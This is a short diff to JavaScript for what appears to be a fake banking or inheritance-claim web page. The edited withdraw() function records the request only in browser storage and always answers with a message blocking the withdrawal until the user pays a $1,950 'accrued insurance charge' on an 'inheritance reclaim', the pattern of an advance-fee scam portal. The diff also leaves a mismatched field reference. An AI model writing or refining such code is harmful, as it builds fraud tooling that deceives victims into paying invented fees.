@@ -177,7 +177,7 @@ function deposit(amount, name) {
 /* ================= WITHDRAW ================= */
 
 function withdraw() {
-  const address = document.getElementById("address").value.trim();
+  const recipient = document.getElementById("name").value.trim();
   const amount = parseFloat(document.getElementById("amount").value);
   const bank = document.getElementById("bank").value;
   const messageEl = document.getElementById("message");
@@ -220,7 +220,7 @@ function withdraw() {
   localStorage.setItem("transactions", JSON.stringify(transactions));
 
   messageEl.style.color = "#fc0f03";
-  messageEl.innerText = `Withdrawal request of ${$amount}  is not processed due to pending payment of the accrued insurance charge of 2.5% of the total inheritance reclaim ($1,950)`;
+  messageEl.innerText = `Withdrawal request of ${amount}  is not processed due to pending payment of the accrued insurance charge of 2.5% of the total inheritance reclaim ($1,950)`;
 
   document.getElementById("address").value = "";
   document.getElementById("amount").value = "";
